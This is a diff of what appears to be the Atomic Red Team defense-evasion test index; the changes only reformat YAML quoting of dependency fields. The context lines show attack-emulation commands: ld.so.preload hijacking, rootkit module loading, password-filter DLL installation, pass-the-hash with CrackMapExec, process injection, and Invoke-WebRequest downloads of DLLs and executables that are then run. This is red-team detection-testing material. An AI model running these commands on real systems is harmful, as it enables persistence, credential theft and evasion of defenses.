@@ -25125,9 +25571,15 @@ defense-evasion:
           default: "%temp%\\T1564.001.txt"
       dependency_executor_name: command_prompt
       dependencies:
-      - description: The file must exist on disk at specified location (#{file_to_modify})
-        prereq_command: 'IF EXIST #{file_to_modify} ( EXIT 0 ) ELSE ( EXIT 1 )'
-        get_prereq_command: 'echo system_Attrib_T1564.001 >> #{file_to_modify}'
+      - description: 'The file must exist on disk at specified location (#{file_to_modify})
+
+'
+        prereq_command: 'IF EXIST #{file_to_modify} ( EXIT 0 ) ELSE ( EXIT 1 )
+
+'
+        get_prereq_command: 'echo system_Attrib_T1564.001 >> #{file_to_modify}
+
+'
       executor:
         command: 'attrib.exe +s #{file_to_modify}
 
@@ -25151,9 +25603,15 @@ defense-evasion:
           default: "%temp%\\T1564.001.txt"
       dependency_executor_name: command_prompt
       dependencies:
-      - description: The file must exist on disk at specified location (#{file_to_modify})
-        prereq_command: 'IF EXIST #{file_to_modify} ( EXIT 0 ) ELSE ( EXIT 1 )'
-        get_prereq_command: 'echo system_Attrib_T1564.001 >> #{file_to_modify}'
+      - description: 'The file must exist on disk at specified location (#{file_to_modify})
+
+'
+        prereq_command: 'IF EXIST #{file_to_modify} ( EXIT 0 ) ELSE ( EXIT 1 )
+
+'
+        get_prereq_command: 'echo system_Attrib_T1564.001 >> #{file_to_modify}
+
+'
       executor:
         command: 'attrib.exe +h #{file_to_modify}
 
@@ -25943,9 +26401,13 @@ defense-evasion:
           default: rootCA.key
       dependency_executor_name: command_prompt
       dependencies:
-      - description: Verify the certificate exists. It generates if not on disk.
-        prereq_command: 'if [ -f #{cert_filename} ]; then exit 0; else exit 1; fi;'
-        get_prereq_command: |-
+      - description: 'Verify the certificate exists. It generates if not on disk.
+
+'
+        prereq_command: 'if [ -f #{cert_filename} ]; then exit 0; else exit 1; fi;
+
+'
+        get_prereq_command: |
           if [ ! -f #{key_filename} ]; then openssl genrsa -out #{key_filename} 4096; fi;
           openssl req -x509 -new -nodes -key #{key_filename} -sha256 -days 365 -subj "/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com" -out #{cert_filename}
       executor:
@@ -25972,9 +26434,13 @@ defense-evasion:
           default: rootCA.key
       dependency_executor_name: command_prompt
       dependencies:
-      - description: Verify the certificate exists. It generates if not on disk.
-        prereq_command: 'if [ -f #{cert_filename} ]; then exit 0; else exit 1; fi;'
-        get_prereq_command: |-
+      - description: 'Verify the certificate exists. It generates if not on disk.
+
+'
+        prereq_command: 'if [ -f #{cert_filename} ]; then exit 0; else exit 1; fi;
+
+'
+        get_prereq_command: |
           if [ ! -f #{key_filename} ]; then openssl genrsa -out #{key_filename} 4096; fi;
           openssl req -x509 -new -nodes -key #{key_filename} -sha256 -days 365 -subj "/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com" -out #{cert_filename}
       executor:
@@ -25998,9 +26464,13 @@ defense-evasion:
           default: rootCA.cer
       dependency_executor_name: powershell
       dependencies:
-      - description: Verify the certificate exists. It generates if not on disk.
-        prereq_command: 'if (Test-Path #{pfx_path}) { exit 0 } else { exit 1 }'
-        get_prereq_command: |-
+      - description: 'Verify the certificate exists. It generates if not on disk.
+
+'
+        prereq_command: 'if (Test-Path #{pfx_path}) { exit 0 } else { exit 1 }
+
+'
+        get_prereq_command: |
           $cert = New-SelfSignedCertificate -DnsName atomicredteam.com -CertStoreLocation cert:\LocalMachine\My
           Export-Certificate -Type CERT -Cert  Cert:\LocalMachine\My\$($cert.Thumbprint) -FilePath #{pfx_path}
           Get-ChildItem Cert:\LocalMachine\My\$($cert.Thumbprint) | Remove-Item
@@ -26091,10 +26561,14 @@ defense-evasion:
           type: String
           default: T1218.004.dll
       dependencies:
-      - description: InstallUtil test harness script must be installed at specified
+      - description: 'InstallUtil test harness script must be installed at specified
           location (#{test_harness})
-        prereq_command: if (Test-Path "#{test_harness}") {exit 0} else {exit 1}
-        get_prereq_command: |-
+
+'
+        prereq_command: 'if (Test-Path "#{test_harness}") {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
           New-Item -Type Directory (split-path #{test_harness}) -ErrorAction ignore | Out-Null
           Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile "#{test_harness}"
       executor:
@@ -26155,10 +26629,14 @@ defense-evasion:
           type: String
           default: T1218.004.dll
       dependencies:
-      - description: InstallUtil test harness script must be installed at specified
+      - description: 'InstallUtil test harness script must be installed at specified
           location (#{test_harness})
-        prereq_command: if (Test-Path "#{test_harness}") {exit 0} else {exit 1}
-        get_prereq_command: |-
+
+'
+        prereq_command: 'if (Test-Path "#{test_harness}") {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
           New-Item -Type Directory (split-path #{test_harness}) -ErrorAction ignore | Out-Null
           Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile "#{test_harness}"
       executor:
@@ -26222,10 +26700,14 @@ defense-evasion:
           type: String
           default: T1218.004.dll
       dependencies:
-      - description: InstallUtil test harness script must be installed at specified
+      - description: 'InstallUtil test harness script must be installed at specified
           location (#{test_harness})
-        prereq_command: if (Test-Path "#{test_harness}") {exit 0} else {exit 1}
-        get_prereq_command: |-
+
+'
+        prereq_command: 'if (Test-Path "#{test_harness}") {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
           New-Item -Type Directory (split-path #{test_harness}) -ErrorAction ignore | Out-Null
           Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile "#{test_harness}"
       executor:
@@ -26289,10 +26771,14 @@ defense-evasion:
           type: String
           default: T1218.004.dll
       dependencies:
-      - description: InstallUtil test harness script must be installed at specified
+      - description: 'InstallUtil test harness script must be installed at specified
           location (#{test_harness})
-        prereq_command: if (Test-Path "#{test_harness}") {exit 0} else {exit 1}
-        get_prereq_command: |-
+
+'
+        prereq_command: 'if (Test-Path "#{test_harness}") {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
           New-Item -Type Directory (split-path #{test_harness}) -ErrorAction ignore | Out-Null
           Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile "#{test_harness}"
       executor:
@@ -26356,10 +26842,14 @@ defense-evasion:
           type: String
           default: T1218.004.dll
       dependencies:
-      - description: InstallUtil test harness script must be installed at specified
+      - description: 'InstallUtil test harness script must be installed at specified
           location (#{test_harness})
-        prereq_command: if (Test-Path "#{test_harness}") {exit 0} else {exit 1}
-        get_prereq_command: |-
+
+'
+        prereq_command: 'if (Test-Path "#{test_harness}") {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
           New-Item -Type Directory (split-path #{test_harness}) -ErrorAction ignore | Out-Null
           Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile "#{test_harness}"
       executor:
@@ -26424,10 +26914,14 @@ defense-evasion:
           type: String
           default: T1218.004.dll
       dependencies:
-      - description: InstallUtil test harness script must be installed at specified
+      - description: 'InstallUtil test harness script must be installed at specified
           location (#{test_harness})
-        prereq_command: if (Test-Path "#{test_harness}") {exit 0} else {exit 1}
-        get_prereq_command: |-
+
+'
+        prereq_command: 'if (Test-Path "#{test_harness}") {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
           New-Item -Type Directory (split-path #{test_harness}) -ErrorAction ignore | Out-Null
           Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile "#{test_harness}"
       executor:
@@ -26491,10 +26985,14 @@ defense-evasion:
           type: String
           default: T1218.004.dll
       dependencies:
-      - description: InstallUtil test harness script must be installed at specified
+      - description: 'InstallUtil test harness script must be installed at specified
           location (#{test_harness})
-        prereq_command: if (Test-Path "#{test_harness}") {exit 0} else {exit 1}
-        get_prereq_command: |-
+
+'
+        prereq_command: 'if (Test-Path "#{test_harness}") {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
           New-Item -Type Directory (split-path #{test_harness}) -ErrorAction ignore | Out-Null
           Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile "#{test_harness}"
       executor:
@@ -26544,10 +27042,14 @@ defense-evasion:
           type: Path
           default: PathToAtomicsFolder\T1218.004\src\InstallUtilTestHarness.ps1
       dependencies:
-      - description: InstallUtil test harness script must be installed at specified
+      - description: 'InstallUtil test harness script must be installed at specified
           location (#{test_harness})
-        prereq_command: if (Test-Path "#{test_harness}") {exit 0} else {exit 1}
-        get_prereq_command: |-
+
+'
+        prereq_command: 'if (Test-Path "#{test_harness}") {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
           New-Item -Type Directory (split-path #{test_harness}) -ErrorAction ignore | Out-Null
           Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile "#{test_harness}"
       executor:
@@ -26762,10 +27264,17 @@ defense-evasion:
           default: "/tmp/T1574006.so"
       dependency_executor_name: bash
       dependencies:
-      - description: The shared library must exist on disk at specified location (#{path_to_shared_library})
+      - description: 'The shared library must exist on disk at specified location
+          (#{path_to_shared_library})
+
+'
         prereq_command: 'if [ -f #{path_to_shared_library ]; then exit 0; else exit
-          1; fi;'
-        get_prereq_command: 'gcc -shared -fPIC -o #{path_to_shared_library} #{path_to_shared_library_source}'
+          1; fi;
+
+'
+        get_prereq_command: 'gcc -shared -fPIC -o #{path_to_shared_library} #{path_to_shared_library_source}
+
+'
       executor:
         command: 'sudo sh -c ''echo #{path_to_shared_library} > /etc/ld.so.preload''
 
@@ -26794,10 +27303,17 @@ defense-evasion:
           default: "/tmp/T1574006.so"
       dependency_executor_name: bash
       dependencies:
-      - description: The shared library must exist on disk at specified location (#{path_to_shared_library})
+      - description: 'The shared library must exist on disk at specified location
+          (#{path_to_shared_library})
+
+'
         prereq_command: 'if [ -f #{path_to_shared_library} ]; then exit 0; else exit
-          1; fi;'
-        get_prereq_command: 'gcc -shared -fPIC -o #{path_to_shared_library} #{path_to_shared_library_source}'
+          1; fi;
+
+'
+        get_prereq_command: 'gcc -shared -fPIC -o #{path_to_shared_library} #{path_to_shared_library_source}
+
+'
       executor:
         command: 'LD_PRELOAD=#{path_to_shared_library} ls
 
@@ -27164,9 +27680,13 @@ defense-evasion:
           default: PathToAtomicsFolder\T1127.001\src\T1127.001.csproj
       dependency_executor_name: powershell
       dependencies:
-      - description: Project file must exist on disk at specified location (#{filename})
-        prereq_command: 'if (Test-Path #{filename}) {exit 0} else {exit 1}'
-        get_prereq_command: |-
+      - description: 'Project file must exist on disk at specified location (#{filename})
+
+'
+        prereq_command: 'if (Test-Path #{filename}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
           New-Item -Type Directory (split-path #{filename}) -ErrorAction ignore | Out-Null
           Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1127.001/src/T1127.001.csproj" -OutFile "#{filename}"
       executor:
@@ -27927,9 +28447,15 @@ defense-evasion:
           default: PathToAtomicsFolder\T1218.007\src\Win32\T1218.msi
       dependency_executor_name: powershell
       dependencies:
-      - description: T1218.msi must exist on disk at specified location (#{msi_payload})
-        prereq_command: 'if (Test-Path #{msi_payload}) {exit 0} else {exit 1}'
-        get_prereq_command: Write-Host "You must provide your own MSI"
+      - description: 'T1218.msi must exist on disk at specified location (#{msi_payload})
+
+'
+        prereq_command: 'if (Test-Path #{msi_payload}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'Write-Host "You must provide your own MSI"
+
+'
       executor:
         command: 'msiexec.exe /q /i "#{msi_payload}"
 
@@ -27969,9 +28495,13 @@ defense-evasion:
           default: PathToAtomicsFolder\T1218.007\src\x64\T1218.dll
       dependency_executor_name: powershell
       dependencies:
-      - description: T1218.dll must exist on disk at specified location (#{dll_payload})
-        prereq_command: 'if (Test-Path #{dll_payload}) {exit 0} else {exit 1}'
-        get_prereq_command: |-
+      - description: 'T1218.dll must exist on disk at specified location (#{dll_payload})
+
+'
+        prereq_command: 'if (Test-Path #{dll_payload}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
           New-Item -Type Directory (split-path #{dll_payload}) -ErrorAction ignore | Out-Null
           Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/src/x64/T1218.dll" -OutFile "#{dll_payload}"
       executor:
@@ -28136,9 +28666,15 @@ defense-evasion:
           default: adstest.txt
       dependency_executor_name: command_prompt
       dependencies:
-      - description: The file must exist on disk at specified location (#{file_name})
-        prereq_command: 'IF EXIST #{file_name} ( EXIT 0 ) ELSE ( EXIT 1 )'
-        get_prereq_command: 'echo normal_text >> #{file_name} >nul 2>&1'
+      - description: 'The file must exist on disk at specified location (#{file_name})
+
+'
+        prereq_command: 'IF EXIST #{file_name} ( EXIT 0 ) ELSE ( EXIT 1 )
+
+'
+        get_prereq_command: 'echo normal_text >> #{file_name} >nul 2>&1
+
+'
       executor:
         command: |
           echo cmd /c echo "Shell code execution."> #{file_name}:#{ads_filename}
@@ -28165,9 +28701,15 @@ defense-evasion:
           default: adstest.txt
       dependency_executor_name: powershell
       dependencies:
-      - description: The file must exist on disk at specified location (#{file_name})
-        prereq_command: 'if (Test-Path #{file_name}) { exit 0 } else { exit 1 }'
-        get_prereq_command: 'New-Item -Path #{file_name} | Out-Null'
+      - description: 'The file must exist on disk at specified location (#{file_name})
+
+'
+        prereq_command: 'if (Test-Path #{file_name}) { exit 0 } else { exit 1 }
+
+'
+        get_prereq_command: 'New-Item -Path #{file_name} | Out-Null
+
+'
       executor:
         command: |
           echo "test" > #{file_name} | set-content -path test.txt -stream #{ads_filename} -value "test"
@@ -28508,9 +29050,13 @@ defense-evasion:
           default: https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027/bin/T1027.zip
       dependency_executor_name: powershell
       dependencies:
-      - description: T1027.exe must exist on disk at specified location
-        prereq_command: 'if (Test-Path #{exe_payload}) {exit 0} else {exit 1}'
-        get_prereq_command: |-
+      - description: 'T1027.exe must exist on disk at specified location
+
+'
+        prereq_command: 'if (Test-Path #{exe_payload}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
           [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
           Invoke-WebRequest "#{url_path}" -OutFile "$env:temp\T1027.zip"
           Expand-Archive -path "$env:temp\T1027.zip" -DestinationPath "$env:temp\temp_T1027.zip\" -Force
@@ -28602,9 +29148,13 @@ defense-evasion:
           default: PathToAtomicsFolder\T1218.008\src\Win32\T1218-2.dll
       dependency_executor_name: powershell
       dependencies:
-      - description: T1218-2.dll must exist on disk at specified location (#{dll_payload})
-        prereq_command: 'if (Test-Path #{dll_payload}) {exit 0} else {exit 1}'
-        get_prereq_command: |-
+      - description: 'T1218-2.dll must exist on disk at specified location (#{dll_payload})
+
+'
+        prereq_command: 'if (Test-Path #{dll_payload}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
           New-Item -Type Directory (split-path #{dll_payload}) -ErrorAction ignore | Out-Null
           Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.008/src/Win32/T1218-2.dll" -OutFile "#{dll_payload}"
       executor:
@@ -28721,9 +29271,13 @@ defense-evasion:
           default: iexplore
       dependency_executor_name: powershell
       dependencies:
-      - description: DLL to inject must exist on disk at specified location (#{dll_path})
-        prereq_command: 'if (Test-Path #{dll_path}) {exit 0} else {exit 1}'
-        get_prereq_command: |-
+      - description: 'DLL to inject must exist on disk at specified location (#{dll_path})
+
+'
+        prereq_command: 'if (Test-Path #{dll_path}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
           New-Item -Type Directory (split-path #{dll_path}) -ErrorAction ignore | Out-Null
           Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1134.004/bin/calc.dll" -OutFile "#{dll_path}"
       executor:
@@ -28838,11 +29392,17 @@ defense-evasion:
           default: atomic.local
       dependency_executor_name: powershell
       dependencies:
-      - description: CrackMapExec executor must exist on disk at specified location
+      - description: 'CrackMapExec executor must exist on disk at specified location
           (#{crackmapexec_exe})
-        prereq_command: 'if(Test-Path #{crackmapexec_exe}) { 0 } else { -1 }'
+
+'
+        prereq_command: 'if(Test-Path #{crackmapexec_exe}) { 0 } else { -1 }
+
+'
         get_prereq_command: 'Write-Host Automated installer not implemented yet, please
-          install crackmapexec manually at this location: #{crackmapexec_exe}'
+          install crackmapexec manually at this location: #{crackmapexec_exe}
+
+'
       executor:
         command: 'crackmapexec #{domain} -u #{user_name} -H #{ntlm} -x #{command}
 
@@ -29009,11 +29569,17 @@ defense-evasion:
           default: PathToAtomicsFolder\T1556.002\src\AtomicPasswordFilter.dll
       dependency_executor_name: powershell
       dependencies:
-      - description: AtomicPasswordFilter.dll must exist on disk at specified location
+      - description: 'AtomicPasswordFilter.dll must exist on disk at specified location
           (#{input_dll})
-        prereq_command: 'if (Test-Path #{input_dll}) {exit 0} else {exit 1}'
-        get_prereq_command: Write-Host "You must provide your own password filter
+
+'
+        prereq_command: 'if (Test-Path #{input_dll}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'Write-Host "You must provide your own password filter
           dll"
+
+'
       executor:
         command: |
           $passwordFilterName = (Copy-Item "#{input_dll}" -Destination "C:\Windows\System32" -PassThru).basename
@@ -29853,9 +30419,13 @@ defense-evasion:
           default: PathToAtomicsFolder\T1055\src\x64\T1055.dll
       dependency_executor_name: powershell
       dependencies:
-      - description: Utility to inject must exist on disk at specified location (#{dll_payload})
-        prereq_command: 'if (Test-Path #{dll_payload}) {exit 0} else {exit 1}'
-        get_prereq_command: |-
+      - description: 'Utility to inject must exist on disk at specified location (#{dll_payload})
+
+'
+        prereq_command: 'if (Test-Path #{dll_payload}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
           New-Item -Type Directory (split-path #{dll_payload}) -ErrorAction ignore | Out-Null
           Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055/src/x64/T1055.dll" -OutFile "#{dll_payload}"
       executor:
@@ -30169,10 +30739,14 @@ defense-evasion:
           default: PathToAtomicsFolder\T1218.009\src\T1218.009.cs
       dependency_executor_name: powershell
       dependencies:
-      - description: The CSharp source file must exist on disk at specified location
+      - description: 'The CSharp source file must exist on disk at specified location
           (#{source_file})
-        prereq_command: 'if (Test-Path #{source_file}) {exit 0} else {exit 1}'
-        get_prereq_command: |-
+
+'
+        prereq_command: 'if (Test-Path #{source_file}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
           New-Item -Type Directory (split-path #{source_file}) -ErrorAction ignore | Out-Null
           Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.009/src/T1218.009.cs" -OutFile "#{source_file}"
       executor:
@@ -30201,10 +30775,14 @@ defense-evasion:
           default: PathToAtomicsFolder\T1218.009\src\T1218.009.cs
       dependency_executor_name: powershell
       dependencies:
-      - description: The CSharp source file must exist on disk at specified location
+      - description: 'The CSharp source file must exist on disk at specified location
           (#{source_file})
-        prereq_command: 'if (Test-Path #{source_file}) {exit 0} else {exit 1}'
-        get_prereq_command: |-
+
+'
+        prereq_command: 'if (Test-Path #{source_file}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
           New-Item -Type Directory (split-path #{source_file}) -ErrorAction ignore | Out-Null
           Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.009/src/T1218.009.cs" -OutFile "#{source_file}"
       executor:
@@ -30302,9 +30880,13 @@ defense-evasion:
           default: PathToAtomicsFolder\T1218.010\src\RegSvr32.sct
       dependency_executor_name: powershell
       dependencies:
-      - description: Regsvr32.sct must exist on disk at specified location (#{filename})
-        prereq_command: 'if (Test-Path #{filename}) {exit 0} else {exit 1}'
-        get_prereq_command: |-
+      - description: 'Regsvr32.sct must exist on disk at specified location (#{filename})
+
+'
+        prereq_command: 'if (Test-Path #{filename}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
           New-Item -Type Directory (split-path #{filename}) -ErrorAction ignore | Out-Null
           Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.010/src/RegSvr32.sct" -OutFile "#{filename}"
       executor:
@@ -30344,10 +30926,14 @@ defense-evasion:
           default: PathToAtomicsFolder\T1218.010\bin\AllTheThingsx86.dll
       dependency_executor_name: powershell
       dependencies:
-      - description: AllTheThingsx86.dll must exist on disk at specified location
+      - description: 'AllTheThingsx86.dll must exist on disk at specified location
           (#{dll_name})
-        prereq_command: 'if (Test-Path #{dll_name}) {exit 0} else {exit 1}'
-        get_prereq_command: |-
+
+'
+        prereq_command: 'if (Test-Path #{dll_name}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
           New-Item -Type Directory (split-path #{dll_name}) -ErrorAction ignore | Out-Null
           Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.010/bin/AllTheThingsx86.dll" -OutFile "#{dll_name}"
       executor:
@@ -30371,9 +30957,15 @@ defense-evasion:
           default: "%temp%\\shell32.jpg"
       dependency_executor_name: command_prompt
       dependencies:
-      - description: Test requires a renamed dll file
-        prereq_command: 'if exist #{dll_file} ( exit 0 ) else ( exit 1 )'
-        get_prereq_command: copy "C:\Windows\System32\shell32.dll" "#{dll_file}"
+      - description: 'Test requires a renamed dll file
+
+'
+        prereq_command: 'if exist #{dll_file} ( exit 0 ) else ( exit 1 )
+
+'
+        get_prereq_command: 'copy "C:\Windows\System32\shell32.dll" "#{dll_file}"
+
+'
       executor:
         name: command_prompt
         elevation_required: false
@@ -30547,9 +31139,13 @@ defense-evasion:
           default: PathToAtomicsFolder\T1036.003\bin\T1036.003.exe
       dependency_executor_name: powershell
       dependencies:
-      - description: Exe file to copy must exist on disk at specified location (#{inputfile})
-        prereq_command: 'if (Test-Path #{inputfile}) {exit 0} else {exit 1}'
-        get_prereq_command: |-
+      - description: 'Exe file to copy must exist on disk at specified location (#{inputfile})
+
+'
+        prereq_command: 'if (Test-Path #{inputfile}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
           New-Item -Type Directory (split-path #{inputfile}) -ErrorAction ignore | Out-Null
           Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1036.003/bin/T1036.003.exe" -OutFile "#{inputfile}"
       executor:
@@ -30944,9 +31540,13 @@ defense-evasion:
           default: "/tmp/T1014"
       dependency_executor_name: bash
       dependencies:
-      - description: The kernel module must exist on disk at specified location (#{rootkit_path})
-        prereq_command: 'if [ -f #{rootkit_path} ]; then exit 0; else exit 1; fi;'
-        get_prereq_command: |-
+      - description: 'The kernel module must exist on disk at specified location (#{rootkit_path})
+
+'
+        prereq_command: 'if [ -f #{rootkit_path} ]; then exit 0; else exit 1; fi;
+
+'
+        get_prereq_command: |
           if [ ! -d #{temp_folder} ]; then mkdir #{temp_folder}; touch #{temp_folder}/safe_to_delete; fi;
           cp #{rootkit_source_path}/* #{temp_folder}/
           cd #{temp_folder}; make
@@ -30988,14 +31588,18 @@ defense-evasion:
           default: "/tmp/T1014"
       dependency_executor_name: bash
       dependencies:
-      - description: The kernel module must exist on disk at specified location (#{rootkit_path})
-        prereq_command: if [ -f /lib/modules/$(uname -r)/#{rootkit_name}.ko ]; then
+      - description: 'The kernel module must exist on disk at specified location (#{rootkit_path})
+
+'
+        prereq_command: 'if [ -f /lib/modules/$(uname -r)/#{rootkit_name}.ko ]; then
           exit 0; else exit 1; fi;
+
+'
         get_prereq_command: "if [ ! -d #{temp_folder} ]; then mkdir #{temp_folder};
           touch #{temp_folder}/safe_to_delete; fi;\ncp #{rootkit_source_path}/* #{temp_folder}/\ncd
           #{temp_folder}; make        \nsudo cp #{temp_folder}/#{rootkit_name}.ko
           /lib/modules/$(uname -r)/\n[ -f #{temp_folder}/safe_to_delete ] && rm -rf
-          #{temp_folder}\nsudo depmod -a"
+          #{temp_folder}\nsudo depmod -a\n"
       executor:
         command: 'sudo modprobe #{rootkit_name}
 
@@ -31200,9 +31804,13 @@ defense-evasion:
           default: PathToAtomicsFolder\T1218.011\src\T1218.011.inf
       dependency_executor_name: powershell
       dependencies:
-      - description: Inf file must exist on disk at specified location (#{inf_to_execute})
-        prereq_command: 'if (Test-Path #{inf_to_execute}) {exit 0} else {exit 1}'
-        get_prereq_command: |-
+      - description: 'Inf file must exist on disk at specified location (#{inf_to_execute})
+
+'
+        prereq_command: 'if (Test-Path #{inf_to_execute}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
           New-Item -Type Directory (split-path #{inf_to_execute}) -ErrorAction ignore | Out-Null
           Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.011/src/T1218.011.inf" -OutFile "#{inf_to_execute}"
       executor:
@@ -31226,9 +31834,13 @@ defense-evasion:
           default: PathToAtomicsFolder\T1218.011\src\T1218.011.inf
       dependency_executor_name: powershell
       dependencies:
-      - description: Inf file must exist on disk at specified location (#{inf_to_execute})
-        prereq_command: 'if (Test-Path #{inf_to_execute}) {exit 0} else {exit 1}'
-        get_prereq_command: |-
+      - description: 'Inf file must exist on disk at specified location (#{inf_to_execute})
+
+'
+        prereq_command: 'if (Test-Path #{inf_to_execute}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
           New-Item -Type Directory (split-path #{inf_to_execute}) -ErrorAction ignore | Out-Null
           Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.011/src/T1218.011.inf" -OutFile "#{inf_to_execute}"
       executor:
@@ -31251,9 +31863,13 @@ defense-evasion:
           default: PathToAtomicsFolder\T1218.011\src\T1218.011_DefaultInstall.inf
       dependency_executor_name: powershell
       dependencies:
-      - description: Inf file must exist on disk at specified location (#{inf_to_execute})
-        prereq_command: 'if (Test-Path #{inf_to_execute}) {exit 0} else {exit 1}'
-        get_prereq_command: |-
+      - description: 'Inf file must exist on disk at specified location (#{inf_to_execute})
+
+'
+        prereq_command: 'if (Test-Path #{inf_to_execute}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
           New-Item -Type Directory (split-path #{inf_to_execute}) -ErrorAction ignore | Out-Null
           Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.011/src/T1218.011_DefaultInstall.inf" -OutFile "#{inf_to_execute}"
       executor:
@@ -31277,9 +31893,13 @@ defense-evasion:
           default: PathToAtomicsFolder\T1218.011\src\T1218.011_DefaultInstall.inf
       dependency_executor_name: powershell
       dependencies:
-      - description: Inf file must exist on disk at specified location (#{inf_to_execute})
-        prereq_command: 'if (Test-Path #{inf_to_execute}) {exit 0} else {exit 1}'
-        get_prereq_command: |-
+      - description: 'Inf file must exist on disk at specified location (#{inf_to_execute})
+
+'
+        prereq_command: 'if (Test-Path #{inf_to_execute}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
           New-Item -Type Directory (split-path #{inf_to_execute}) -ErrorAction ignore | Out-Null
           Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.011/src/T1218.011_DefaultInstall.inf" -OutFile "#{inf_to_execute}"
       executor:
@@ -31606,16 +32226,24 @@ defense-evasion:
           default: "$env:TEMP\\T1574.010_weak_permission_file.txt"
       dependency_executor_name: powershell
       dependencies:
-      - description: A file must exist on disk at specified location (#{weak_permission_file})
+      - description: 'A file must exist on disk at specified location (#{weak_permission_file})
+
+'
         prereq_command: 'if (Test-Path #{weak_permission_file}) {exit 0} else {exit
-          1}'
-        get_prereq_command: |-
+          1}
+
+'
+        get_prereq_command: |
           New-Item #{weak_permission_file} -Force | Out-Null
           Set-Content -Path #{weak_permission_file} -Value " T1574.010 Weak permission file"
-      - description: A file to replace the original weak_permission_file. In an attack
+      - description: 'A file to replace the original weak_permission_file. In an attack
           this would be the malicious file gaining extra privileges
-        prereq_command: 'if (Test-Path #{malicious_file}) {exit 0} else {exit 1}'
-        get_prereq_command: |-
+
+'
+        prereq_command: 'if (Test-Path #{malicious_file}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
           New-Item -Type Directory -Path $env:TEMP\T1574.010\ -Force | Out-Null
           New-Item #{malicious_file} -Force | Out-Null
           Set-Content -Path #{malicious_file} -Value " T1574.010 Malicious file"
@@ -31925,9 +32553,13 @@ defense-evasion:
           default: PathToAtomicsFolder\T1218\src\x64\T1218.dll
       dependency_executor_name: powershell
       dependencies:
-      - description: T1218.dll must exist on disk at specified location (#{dll_payload})
-        prereq_command: 'if (Test-Path #{dll_payload}) {exit 0} else {exit 1}'
-        get_prereq_command: |-
+      - description: 'T1218.dll must exist on disk at specified location (#{dll_payload})
+
+'
+        prereq_command: 'if (Test-Path #{dll_payload}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
           New-Item -Type Directory (split-path #{dll_payload}) -ErrorAction ignore | Out-Null
           Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/x64/T1218.dll" -OutFile "#{dll_payload}"
       executor:
@@ -31969,9 +32601,13 @@ defense-evasion:
           default: PathToAtomicsFolder\T1218\src\Win32\T1218-2.dll
       dependency_executor_name: powershell
       dependencies:
-      - description: T1218-2.dll must exist on disk at specified location (#{dll_payload})
-        prereq_command: 'if (Test-Path #{dll_payload}) {exit 0} else {exit 1}'
